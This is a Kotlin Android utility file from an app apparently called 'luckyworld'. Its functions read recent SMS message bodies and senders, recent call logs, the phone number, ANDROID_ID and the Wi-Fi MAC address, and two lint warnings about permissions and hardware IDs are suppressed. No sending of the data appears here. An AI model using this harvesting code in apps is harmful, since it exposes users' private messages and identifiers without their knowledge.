package com.mind.luckyworld.utils

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.Context
import android.content.Context.ACTIVITY_SERVICE
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.os.BatteryManager
import android.os.Build
import android.provider.Telephony
import android.widget.Toast
import com.mind.luckyworld.model.SmsLog
import android.provider.CallLog
import android.provider.Settings
import android.util.Log
import java.net.NetworkInterface
import java.util.*
import android.telephony.TelephonyManager
import android.net.wifi.WifiManager


fun getAllSms(context: Context): List<SmsLog> {
    val smsList = mutableListOf<SmsLog>()
    val cr = context.contentResolver
    val c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
    var totalSMS = 0
    if (c != null) {
        totalSMS = c.count
        if (c.moveToFirst()) {
            val inc: Int = if (totalSMS < 6) {
                totalSMS
            } else {
                5
            }
            for (j in 0 until inc) {
                val type: String =
                    when (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                        Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
                        else -> {
                            ""
                        }
                    }
                val sms = SmsLog(
                    c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID)),
                    c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)),
                    c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)),
                    c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE)),
                    type
                )
                smsList.add(sms)
                c.moveToNext()
            }
        }
        c.close()
        return smsList
    } else {
        Toast.makeText(context, "No message to show!", Toast.LENGTH_SHORT).show()
        return emptyList()
    }
}

fun getCallDetails(context: Context): List<com.mind.luckyworld.model.CallLog> {

    val callLogList = mutableListOf<com.mind.luckyworld.model.CallLog>()

    val contacts = CallLog.Calls.CONTENT_URI
    val cursor = context.contentResolver.query(
        contacts,
        null,
        null,
        null,
        android.provider.CallLog.Calls.DATE + " DESC limit 5;"
    )

    if (cursor != null) {
        val totalCount = cursor.count
        if (cursor.moveToFirst()) {
            val inc: Int = if (totalCount < 6) {
                totalCount
            } else {
                5
            }
            for (j in 0 until inc) {
                val callLog = com.mind.luckyworld.model.CallLog(
                    cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)),
                    cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)),
                    cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)),
                    cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                )
                cursor.moveToNext()
                callLogList.add(callLog)
            }
        }
        cursor.close()
        return callLogList
    } else {
        Toast.makeText(context, "No message to show!", Toast.LENGTH_SHORT).show()
        return emptyList()
    }
}


fun getDeviceName(): String {
    val manufacturer = Build.MANUFACTURER
    val model = Build.MODEL
    return if (model.startsWith(manufacturer)) {
        capitalize(model)
    } else {
        capitalize(manufacturer) + " " + model
    }
}

fun capitalize(s: String?): String {
    if (s == null || s.isEmpty()) {
        return ""
    }
    val first = s[0]
    return if (Character.isUpperCase(first)) {
        s
    } else {
        Character.toUpperCase(first) + s.substring(1)
    }
}

@SuppressLint("HardwareIds")
fun getDeviceId(context: Context): String {
    return Settings.Secure.getString(
        context.contentResolver,
        Settings.Secure.ANDROID_ID
    )
}

fun getWifiMacAddress(): String {
    try {
        val interfaceName = "wlan0"
        val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
        for (intf in interfaces) {
            if (!intf.name.equals(interfaceName, ignoreCase = true)) {
                continue
            }
            val mac = intf.hardwareAddress ?: return ""
            val buf = StringBuilder()
            for (aMac in mac) {
                buf.append(String.format("%02X:", aMac))
            }
            if (buf.isNotEmpty()) {
                buf.deleteCharAt(buf.length - 1)
            }
            return buf.toString()
        }
    } catch (ex: Exception) {
        Log.e("DeviceUtils", ex.message, ex)
    }
    return ""
}

fun getMemoryInfo(context: Context): String {
    val memoryInfo = ActivityManager.MemoryInfo()
    val activityManager =
        context.getSystemService(ACTIVITY_SERVICE) as ActivityManager
    activityManager.getMemoryInfo(memoryInfo)
    val runtime = Runtime.getRuntime()
    val strMemInfo =
        (runtime.freeMemory().toDouble() / runtime.totalMemory().toDouble() * 100).toLong()
    return strMemInfo.toString()
}

fun getBatteryLevel(context: Context): String {
    val iFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
    val batteryStatus = context.registerReceiver(null, iFilter)
    val level = if (batteryStatus != null) batteryStatus.getIntExtra(
        BatteryManager.EXTRA_LEVEL,
        -1
    ) else -1
    val scale = if (batteryStatus != null) batteryStatus.getIntExtra(
        BatteryManager.EXTRA_SCALE,
        -1
    ) else -1
    val batteryPct = level / scale.toFloat()
    return (batteryPct * 100).toInt().toString()
}

@SuppressLint("MissingPermission")
fun getPhoneNumber(context: Context): String {
    var mPhoneNumber: String = ""
    val tMgr = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager?
    if (tMgr != null) {
        mPhoneNumber = tMgr.line1Number ?: ""
        return mPhoneNumber
    } else {
        return mPhoneNumber
    }
}

fun isNetworkAvailable(context: Context): Boolean {
    val connectivityManager =
        context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    val networkInfo = connectivityManager.activeNetworkInfo
    return networkInfo != null && networkInfo.isConnected
}